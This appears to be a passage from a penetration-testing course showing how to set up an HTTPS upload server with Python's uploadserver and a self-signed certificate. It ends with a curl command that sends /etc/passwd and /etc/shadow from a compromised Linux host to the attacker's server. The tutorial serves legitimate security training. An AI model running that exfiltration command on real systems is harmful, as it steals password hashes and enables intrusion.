## Web Upload

As mentioned in the `Windows File Transfer Methods` section, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page. For this Linux example, let's see how we can configure the `uploadserver` module to use `HTTPS` for secure communication.

The first thing we need to do is to install the `uploadserver` module.

#### Pwnbox - Start Web Server

Pwnbox - Start Web Server

```shell-session
glack@htb[/htb]$ python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Now we need to create a certificate. In this example, we are using a self-signed certificate.

#### Pwnbox - Create a Self-Signed Certificate

Pwnbox - Create a Self-Signed Certificate

```shell-session
glack@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

#### Pwnbox - Start Web Server

Pwnbox - Start Web Server

```shell-session
glack@htb[/htb]$ mkdir https && cd https
```

Pwnbox - Start Web Server

```shell-session
glack@htb[/htb]$ python3 -m uploadserver 443 --server-certificate /root/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.

#### Linux - Upload Multiple Files

Linux - Upload Multiple Files

```shell-session
glack@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

We used the option `--insecure` because we used a self-signed certificate that we trust.
